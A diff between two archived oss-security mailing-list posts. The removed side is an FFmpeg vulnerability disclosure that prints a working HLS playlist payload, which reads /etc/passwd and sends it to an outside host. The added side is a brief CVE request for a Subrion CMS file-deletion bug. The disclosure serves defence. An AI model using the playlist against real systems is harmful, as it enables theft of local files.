@@ -1,62 +1,19 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/01/13/3
-Message-ID: <56962EA3.5000108@securityvulns.ru>
-Date: Wed, 13 Jan 2016 14:01:55 +0300
-From: Vladimir Dubrovin <vlad@...urityvulns.ru>
-To: oss-security@...ts.openwall.com
-Subject: Fwd: FFmpeg: stealing local files with HLS+concat
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/08/27/1
+Message-ID: <654bd3de.fa5.156cc59cf29.Coremail.hongkun.zeng@dbappsecurity.com.cn>
+Date: Sat, 27 Aug 2016 22:14:13 +0800 (GMT+08:00)
+From: 曾鸿坤 <hongkun.zeng@...ppsecurity.com.cn>
+To: oss-security <oss-security@...ts.openwall.com>
+Subject: CVE Request - Intelliants Subrion CMS Arbitrary Files Delete
 Content-Type: text/plain; charset=utf-8
 
-
----------- Forwarded message ----------
-From: Максим Андреев <andreevmaxim@...il.com>
-Date: 13 January 2016 at 13:41
-Subject: FFmpeg: stealing local files with HLS+concat
-To: oss-security@...ts.openwall.com
+Intelliants Subrion CMS Arbitrary Files Delete
+This vulnerability allows remote authenticated users to delete arbitrary files on the server.
+Fix commit: https://github.com/intelliants/subrion/commit/bf2596f2ab27e37456910886e69b48484a76dd64
 
 
-Hello!
-I found some strange behavior in ffmpeg which can lead to stealing local
-files during ffmpeg/ffprobe exec, it's also applied to libav.
-
-I've underestimated the impact of this bug, so it was full disclosured
-in this article (Russian language, but google translate works fine with
-it) - http://habrahabr.ru/company/mailru/blog/274855
+The auto-upgrader patch has been released.
+Could you allocate a CVE ID for this?
 
 
-In short:
-if linux user download specially prepared video file (with any
-extension: avi/mov/etc..) which contains HLS m3u8 playlist with "concat"
-protocol in url:,
-#EXTM3U
-#EXT-X-MEDIA-SEQUENCE:0
-#EXTINF:10.0,
-concat:http://dx.su/header.m3u8|file:///etc/passwd
-#EXT-X-ENDLIST
-
-header.m3u8:
-#EXTM3U
-#EXT-X-MEDIA-SEQUENCE:0
-#EXTINF:,
-http://example.org?
-
-If user launches ffmpeg-based video player (MPlayer, etc..), first line
-of /etc/passwd will be sent to http://example.org? in
-http://example.org?# $FreeBSD: release/100.0/et..  request.
-The same happens when file manager tries to generate thumbnail for this
-file.
-
-All this can be applied to server-run ffmpeg during video conversion.
-FFmpeg/libav security teams are already notified, but official patches
-are not available yet, so you can rebuild ffmpeg with --disable-network
-configure option which prevents this vulnerability from being exploited.
-
-Moreover, it's always recommended to run ffmpeg in isolated environment
-when processing untrusted files
-(googleonlinesecurity.blogspot.ru/2014/01/ffmpeg-and-thousand-fixes.html)
-
--- 
-Maxim Andreev
-
-
-
+Thank you
